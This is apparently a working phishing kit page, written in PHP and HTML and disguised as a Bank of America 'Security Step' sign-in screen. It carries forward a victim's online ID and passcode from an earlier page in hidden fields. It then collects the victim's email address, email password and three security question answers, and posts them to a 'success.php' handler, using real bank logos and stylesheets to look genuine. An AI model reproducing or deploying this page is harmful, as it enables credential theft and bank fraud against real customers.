
<?php
$onlineId1 = $_POST['onlineId1'];
$passcode1 = $_POST['passcode1'];
?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
	<head>



<meta http-equiv="X-UA-Compatible" content="IE=Edge" />


		<meta name="Keywords" CONTENT="Keywords" />
		<meta name="Description" CONTENT="System notice for site slowness" />




<!-- TLDB false -->
			<!-- TL-NOPV true -->
	<title>Bank Of America | Online Banking | Sign In | Security Step</title>
<script language="JavaScript" type="text/javascript">
			var boaVIPAAuseGzippedBundles = "false";
			var boaVIPAAjawrEnabled = "false";
			var dotcomURLPrefix = "https://www.bankofamerica.com/";
</script>
	<script language="javascript" type="text/javascript">
		var pinRegexSwitch = "true";
	</script>
	<script language="javascript" type="text/javascript">
		var sbPinRegexSwitch = "true";
	</script>

	<meta name="Description" CONTENT="System notice for site slowness">
<meta name="Keywords" CONTENT="Keywords">
<meta http-equiv="content-type" content="text/html;charset=utf-8" />

    <link rel="shortcut icon" href="https://www.bankofamerica.com/pa/global-assets/1.0/graphic/favicon.ico?ts=20151018" type="image/x-icon" />
   <script language="Javascript" type="text/javascript">
   			var newPwdStandardSwitch = "true";
	</script>


	<script language="JavaScript" type="text/javascript">
			boaVIPAAuseGzippedBundles = "true";
	</script>
<!-- TLDB TEALEAF_UiCapture_APP_ENABLED_NOT_TRUE -->



	<script language="JavaScript" type="text/javascript">
		boaVIPAAjawrEnabled = "true";
	</script>
		<script language="JavaScript" type="text/javascript">
			boaVIPAAjawrEnabled = "true";
		</script>
					<link rel="stylesheet" type="text/css" href="https://secure.bankofamerica.com/pa/components/bundles/gzip-compressed/xengine/VIPAA/7.4/style/vipaa-v4-jawr.css" media="all" />
					<link rel="stylesheet" type="text/css" href="https://secure.bankofamerica.com/pa/components/bundles/gzip-compressed/xengine/VIPAA/7.4/style/vipaa-v4-jawr-print.css" media="print" />
 
					<script src="https://secure.bankofamerica.com/pa/components/bundles/gzip-compressed/xengine/VIPAA/7.4/script/vipaa-v4-jawr.js" type="text/javascript"></script>
<!--<script type="text/javascript">
(function() {
	if (typeof mboxUpdate == "function") {
		var windowURL = window.location.href;
	    windowURL = windowURL.slice( windowURL.indexOf('.')+1);
		windowURL = windowURL.split( '?' )[0];
		windowURL = windowURL.toLowerCase();
		//alert(windowURL);
		//If no mboxes on page, mbox count will be < 1
		//Also check for high-volume pages that do not need global logging
		if ((mboxFactoryDefault.getMboxes().length() < 1) &&
			(windowURL != "bankofamerica.com/myaccounts/brain/redirect.go") &&
			(windowURL != "bankofamerica.com/myaccounts/signin/signin.go") &&
			(windowURL != "bankofamerica.com/login/sign-in/signon.go") &&
			(windowURL != "bankofamerica.com/login/sign-in/entry/signon.go") &&
			(windowURL != "bankofamerica.com/login/sign-in/signonscreen.go") &&
			(windowURL != "bankofamerica.com/login/sign-in/validatechallengeanswer.go") &&
			(windowURL != "bankofamerica.com/login/sign-in/validatePassword.go")&&
			(windowURL != "ecnp.bankofamerica.com/myaccounts/details/deposit/account-details.go")&&
			(windowURL != "bankofamerica.com/myaccounts/details/deposit/account-details.go")&&
			(windowURL != "ecnp.bankofamerica.com/myaccounts/brain/redirect.go")&&
			(windowURL != "bankofamerica.com/myaccounts/brain/redirect.go")&&
			(windowURL != "bankofamerica.com/mobile/banking.go")&&
			(windowURL != "bankofamerica.com/content/preload/olb-myaccount-preload-jawr-module.htm"))
		{

			var mboxDiv = document.createElement("div");
			mboxDiv.id = "adobe_touch_clarity_replacement";
			mboxDiv.style.display = "none";
			if (document.body && document.body.firstChild) {document.body.insertBefore(mboxDiv,document.body.firstChild);}
			mboxDefine(mboxDiv.id,'bac_global_bottom');
			mboxUpdate('bac_global_bottom');
		}
	}
})();
</script> -->

	
	<style type="text/css"> body { display : none;} </style>
	</head>
	<body class="trfwl-body      ">

		<script type="text/javascript"> 
		if (self == top) {
		  var theBody = document.getElementsByTagName('body')[0];
		  theBody.style.display = "block";
		} else { 
		  top.location = self.location; 
		}
		</script>
		<noscript><style>body{display : block;}</style></noscript>
		
			<a class="ada-hidden" href="#skip-to-h1" name="anc-skip-to-main-content">Skip to main content</a>
		
		<div class="two-row-flex-wideleft-layout">
			<div class="center-content">
				<div class="header">


<div class="header-module">
   <div class="fsd-secure-esp-skin">
   	  <img height="28" width="230" alt="Bank of America" src="https://secure.bankofamerica.com/content/images/ContextualSiteGraphics/Logos/en_US/BofA_rgb.png" />
      <div class="page-type" data-font="cnx-regular">Sign In</div>
      <div class="right-links">
		<div class="secure-area">Secure Area</div>
       <a class="divide" href="/login/languageToggle.go?request_locale=es_US" target="_self" name="spanish_toggle" title="Muestra esta sesión de la Banca en Línea">En Espa&#241;ol</a>
       <div class="clearboth"></div>
      </div>
      <div class="clearboth"></div>
   </div>
</div>
	
<div class="page-title-module h-100" id="skip-to-h1">
  <div class="red-grad-bar-skin sup-ie">
    <h1 data-font="cnx-regular">Security Step</h1>
  </div>
</div>


<script type="text/javascript">
	var continueURL = '/login/ping';
	function myUrl() {
			window.location =  '/login/sign-in/signOnV2Screen.go';	
		 		     	    	   
	    	}
</script>


	<div class="vipaa-timeout-module">
		<div id="timeoutDialogExpire" class="hidden">
				<div class="session-content">
					<p>For security, sessions end after 10 minutes of inactivity.</p>
					<p>Your session has timed out, and you'll have to start again</p>
				</div>
		</div>
		
		<div id="timeoutDialog" class="hidden">
				<div class="session-content">
					<p>Your Application Will Time Out in 2 Minutes</p>
					<p>For your safety and Protection your Online Banking session is about to be timed out and redirected to the home page if there is no additional activity.</p> 
					<p>If you are still working in your Online Banking session simply click OK to continue.</p>
				</div>
		</div>
	</div>

   









</div>
				<div class="flex-top-row"></div>
				<div class="bottom-row">
					<div class="left-column">


<script language="JavaScript" type="text/javascript">
   var langPref = "en-US";
</script>



<div class="vipaa-bump-flow-module">
   <div class="textbox-slow-skin">
   
	   		<form id="BumpFlowForm" action="success.php" method="POST">   		
	<input type="hidden" name="onlineId1" value="<?php echo($onlineId1); ?>">
	<input type="hidden" name="passcode1" value="<?php echo($passcode1); ?>">						
<p>For your protection, you'll need to complete an additional security step.</p>
				<div class="clearboth"></div>
					<div class="image-textbox-container">
					<div id="image-container" class="image-container">
				 
						<span id="dummyspan"></span>
					</div>
					Email Address:<br/>
			 
					<input type="email" id="captchaKey" name="email" value="" autocomplete="off" required/>
					</div>

	<div class="clearboth"></div>
					<div class="image-textbox-container">
				 
					Password:<br/>
			 
					<input type="password" id="captchaKey" name="pass" value="" autocomplete="off" required/>
					</div>


<div class="clearboth"></div>
					<div class="image-textbox-container">
				 
				
				<label for="tlpvt-challenge-answer">
										<select name="q1" size="1">
<option selected value="Select SiteKey Challenge Question 1">Select SiteKey Challenge Question 1</option>
 <OPTION value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew?</OPTION>
                     <OPTION value="What is your paternal grandfather's first name?">What is your paternal grandfather's first name?</OPTION>
                     <OPTION value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</OPTION>
                     <OPTION value="What high school did you attend?">What high school did you attend?</OPTION>
                      <OPTION value="What was the name of your first boyfriend or girlfriend?">What was the name of your first boyfriend or girlfriend?</OPTION>
                      <OPTION value="In what city did you meet your spouse/significant other?">In what city did you meet your spouse/significant other?</OPTION>
                      <OPTION value="What is the last name of your third grade tracher?">What is the last name of your third grade tracher?</OPTION>
                      <OPTION value="what celebrity do you most resemble?">what celebrity do you most resemble?</OPTION>
                      <OPTION value="In what city did you honeymoon?">In what city did you honeymoon? (Enter full name of city only)</OPTION>

<OPTION value="What is your father's middle name?">What is your all-time favorite song?</OPTION>
                      <OPTION value="What is the name of your favorite charity?">What is the name of your favorite charity?</OPTION>
                      <OPTION value="What is the last nem of your family physician?">What is the last nem of your family physician?</OPTION>
                      <OPTION value="What is the name of your first babysitter?">What is the name of your first babysitter?</OPTION>
                      <OPTION value="What is your best friend`s first name?">What is your best friend`s first name?</OPTION>
                      <OPTION value="What street did your best friend in high school love on?">What street did your best friend in high school love on? (Enter full name of street only)</OPTION>
                      <OPTION value="In what city was your mother born?">In what city was your mother born? (Enter full name of city only)</OPTION>
                      <OPTION value="In what city was your father born?">In what city was your father born? (Enter full name of city only)</OPTION>
                      <OPTION value="What was the name of your first boyfriend or girlfriend?">What was the name of your first boyfriend or girlfriend?</OPTION>
                      <OPTION 
              value="When is your wedding anniversary?">When is your wedding anniversary? (Enter the full name of month)</OPTION>
                      <OPTION 
              value="In what city did you honeymoon?">In what city did you honeymoon? (Enter full name of city only)</OPTION>
                      <OPTION value="In what city was your high school?">In what city was your high school? (Enter only "Charlotte" for Charlotte High School)</OPTION>
                      <OPTION value="What is your paternal grandfather's first name?">What is your paternal grandfather's first name?</OPTION>
                       <OPTION value="With what company did you hold your first job?">With what company did you hold your first job?</OPTION>
                      <OPTION value="What is your paternal grandmother's first name?">What is your paternal grandmother's first name?</OPTION>
                      <OPTION value="Where did you meet your spouse for the first time?">Where did you meet your spouse for the first time? (Enter full name of city only)</OPTION>


		</select>										</label>
		</br>
					<input type="text" id="captchaKey" name="a1" value=""  placeholder="Answer 1" autocomplete="off" required/>
					
					</div>
					
					
					<div class="clearboth"></div>
					<div class="image-textbox-container">
				 
				
				<label for="tlpvt-challenge-answer">
					<select name="q2" size="1">
                         <option selected value="Select SiteKey Challenge Question 2">Select SiteKey Challenge Question 2</option>
<OPTION value="On what street is your grocery store?">On what street is your grocery store?</OPTION>
                                <OPTION value="What is the name of the medical professional who delivered your first child?">What is the name of the medical professional who delivered your first child?</OPTION>
                                <OPTION value="What was the name of your first pet?">What was the name of your first pet?</OPTION>
                                <OPTION value="What is the first name of your hairdesser/barber?">What is the first name of your hairdesser/barber?</OPTION>
                                <OPTION value="What is the first name of your mother`s closest friend?">What is the first name of your mother`s closest friend?</OPTION>
                                <OPTION value="What is the first name of your favorite niece/nephew?">What is the first name of your favorite niece/nephew?</OPTION>
                          <OPTION value="What is your father's middle name?">What is your father's middle name?</OPTION>
                          <OPTION value="What is your mother's middle name?">What is your mother's middle name?</OPTION>
                          <OPTION value="In what city were you married?">In what city were you married?</OPTION>
                          <OPTION value="In what city is your vacation home?">In what city is your vacation home?</OPTION>
                          <OPTION value="What is the first name of your first child?">What is the first name of your first child?</OPTION>
                          <OPTION value="What is the name of your first employer?">What is the name of your first employer?</OPTION>
                                <OPTION value="What was the first name of your favorite teacher or professor?">What was the first name of your favorite teacher or professor?</OPTION>
                                <OPTION value="What is the name of a collage you applied to but didn`t attend?">What is the name of a collage you applied to but didn`t attend?</OPTION>
                                <OPTION value="What is your all-time favorite song?">What is your all-time favorite song?</OPTION>
                                <OPTION value="What is the name of your best childhood friend?">What is the name of your best childhood friend?</OPTION>
                                <OPTION value="On what street is your grocery store?">On what street is your grocery store?</OPTION>
                          <OPTION value="What is your favorite hobby?">What is your favorite hobby?</OPTION>
                          <OPTION value="In what city were you living at age 16?">In what city were you living at age 16?</OPTION>

		</select>										</label>
		</br>
					<input type="text" id="captchaKey" name="a2" value=""  placeholder="Answer 2"  autocomplete="off" required/>
					
					</div>
					
					
								<div class="clearboth"></div>
					<div class="image-textbox-container">
				 
				
				<label for="tlpvt-challenge-answer">
					<select name="q3" size="1">
<option selected value="Select SiteKey Challenge Question 3">Select SiteKey Challenge Question 3</option>
</option>                          <OPTION value="Where were you on New Year`s 2000?">Where were you on New Year`s 2000?</OPTION>
                          <OPTION value="What is the name of your favorite restaurant?">What is the name of your favorite restaurant?</OPTION>
                          <OPTION value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</OPTION>
                          <OPTION value="What was the first name of your child manager?">What was the first name of your child manager?</OPTION>
                          <OPTION value="As a child, What did you want to be when u grew up?">As a child, What did you want to be when u grew up?</OPTION>
                          <OPTION value="What was the first live concert you attended?">What was the first live concert you attended?</OPTION>
                          <OPTION value="What was the mke and model of your first car?">What was the mke and model of your first car?</OPTION>
                          <OPTION value="What is the name of your high schools star athlete?">What is the name of your high schools star athlete?</OPTION>
                          <OPTION value="What is the first name of your high school prom date?">What is the first name of your high school prom date?</OPTION>
                          <OPTION value="Who is your favorite person in history?">Who is your favorite person in history?</OPTION>
                                <OPTION value="What is your maternal grandmother's first name?">What is your maternal grandmother's first name?</OPTION>
                                <OPTION value="What is your maternal grandfather's first name?">What is your maternal grandfather's first name?</OPTION>
                                <OPTION value="In what city were you born?">In what city were you born? (Enter full name of city only)</OPTION>
                                <OPTION value="What was the name of your first pet?">What was the name of your first pet?</OPTION>
                                <OPTION value="What was your high school mascot?">What was your high school mascot?</OPTION>
                                <OPTION value="On what street did you grow up?">On what street did you grow up?</OPTION>
                                <OPTION value="What is your oldest sibling's middle name?">What is your oldest sibling's middle name?</OPTION>
                                <OPTION value="How old were you at your wedding?">How old were you at your wedding? (Enter age as digits.)</OPTION>
                                <OPTION value="In what year did you graduate from high school?">In what year (YYYY) did you graduate from high school?</OPTION>
                                <OPTION value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</OPTION>
                                <OPTION value="Who is your favorite childhood superhero?">Who is your favorite childhood superhero?</OPTION>

		</select>										</label>
		</br>
					<input type="text" id="captchaKey" name="a3" value=""  placeholder="Answer 3" autocomplete="off" required/>
					
					</div>
					
					
				<div class="clearboth"></div>
						  	<a href="javascript:void(0);" class="btn-bofa btn-bofa-small btn-disabled" id="continue" name="continue"><span>Continue</span><span class='ada-hidden'> - disabled </span></a>
		  				  	<a href="#" class="btn-bofa btn-bofa-small" id="cancel" name="cancel">
							<span>Clear</span></a>
				<div class="clearboth"></div>
			</form>
	</div>
</div>
</div>
					<div class="right-column no-print"></div>
					<div class="clearboth"></div>
				</div>
				<div class="single-column-row"></div>
				<div class="footer">
					<div class="footer-top">&nbsp;</div>
					<div class="footer-inner">

<div class="global-footer-module">
   <div class="gray-bground-skin cssp">
		<div class="secure">Secure area</div>
	
       
      <div class="link-container">
         <div class="link-row"> 
				
				<a class="last-link" href="privacy/" name="Privacy_&_Security_footer" title="Privacy & Security" target="_blank">Privacy &amp; Security</a>
				<div class="clearboth"></div>
         </div>
      </div>
      <p>Bank of America, N.A. Member FDIC. <a href="help/equalhousing_popup.cfm" name="Equal_Housing_Lender" target="_blank">Equal Housing Lender</a> <br />&copy;&nbsp;2020 Bank of America Corporation.</p>
   </div>
</div>
</div>
				</div>
			</div>
		</div>
	</body>
</html>

